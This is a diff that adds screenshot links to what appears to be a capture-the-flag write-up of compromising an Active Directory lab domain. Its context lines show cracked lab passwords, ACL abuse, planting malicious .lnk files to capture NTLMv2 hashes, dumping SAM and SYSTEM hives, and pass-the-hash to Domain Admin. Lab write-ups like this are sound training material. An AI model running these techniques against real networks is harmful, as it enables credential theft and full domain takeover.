@@ -54,6 +54,8 @@ id  username         full_name                   role            password
 
 ### Cracked Hashes
 
+![CrackStation results](screenshots/cracked-hashes.png)
+
 | id | username | password | valid? |
 |----|----------|----------|--------|
 | 1 | r.widdleton | lilronron | ✅ Valid |
@@ -122,9 +124,13 @@ nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p 'lilronron' --bloodhound -
 
 Ingest the `.zip` into BloodHound and run the **Kerberoastable Users** query.
 
+![BloodHound — Kerberoastable Users](screenshots/bloodhound-kerberoastable.png)
+
 **Key findings:**
 - `r.haggard` is **Kerberoastable**
 - `r.haggard` has **ForcePasswordChange** rights over `h.potch`
+
+![BloodHound — r.haggard ForcePasswordChange over h.potch](screenshots/bloodhound-forcepasswordchange.png)
 
 ---
 
@@ -179,6 +185,10 @@ Nothing found — moving on.
 
 ## ACL Abuse — ForcePasswordChange (`h.potch`)
 
+BloodHound shows the exact command to abuse this right:
+
+![BloodHound — ForcePasswordChange abuse instructions](screenshots/bloodhound-forcepasswordchange-howto.png)
+
 `r.haggard` has `ForcePasswordChange` rights over `h.potch`, allowing us to set a new password without knowing the current one:
 
 ```bash
@@ -214,6 +224,8 @@ Write access to `File-Share` opens several attack paths: dropping malicious file
 With write access to a share, we plant a malicious `.lnk` file. When any user browses the share, Windows auto-authenticates to our listener and leaks their NTLMv2 hash.
 
 > **Note:** The NetExec `slinky` module (which automates this) was non-functional against this target — `ntlm_theft.py` was used instead.
+
+![NetExec slinky module — no hits](screenshots/slinky-module.png)
 
 ### Step 1 — Generate malicious files
 
@@ -253,6 +265,8 @@ hashcat hash.txt /usr/share/wordlists/rockyou.txt
 
 BloodHound confirms `h.grangon` is a member of **Remote Management Users**.
 
+![BloodHound — h.grangon Remote Management Users](screenshots/bloodhound-remote-management.png)
+
 ```bash
 nxc winrm 10.1.130.199 -u 'h.grangon' -p 'magic4ever'
 ```
@@ -272,6 +286,8 @@ evil-winrm -i 10.1.130.199 -u 'h.grangon' -p 'magic4ever'
 
 -a----  9/2/2025  7:41 PM  32  user.txt
 ```
+
+![Evil-WinRM session as h.grangon](screenshots/winrm-evil-winrm.png)
 
 ---
 
@@ -298,6 +314,8 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 *Evil-WinRM* PS C:\Users\h.grangon\desktop> reg save hklm\sam SAM
 *Evil-WinRM* PS C:\Users\h.grangon\desktop> reg save hklm\system SYSTEM
 ```
+
+![reg save SAM and SYSTEM](screenshots/reg-save.png)
 
 ### Download to Kali
 
@@ -346,6 +364,8 @@ nxc smb BUILDINGMAGIC.LOCAL -u users.txt -H '520126a03f5d5a8d836f1c4f34ede7ce' -
 ```
 
 `a.flatch` shares the same password hash as the local Administrator — a classic password reuse scenario detectable only via Pass-the-Hash. BloodHound confirms `a.flatch` is a member of **Domain Admins** (marked with a high-value target diamond in BloodHound).
+
+![BloodHound — a.flatch Domain Admins membership](screenshots/bloodhound-domain-admin.png)
 
 ---
 
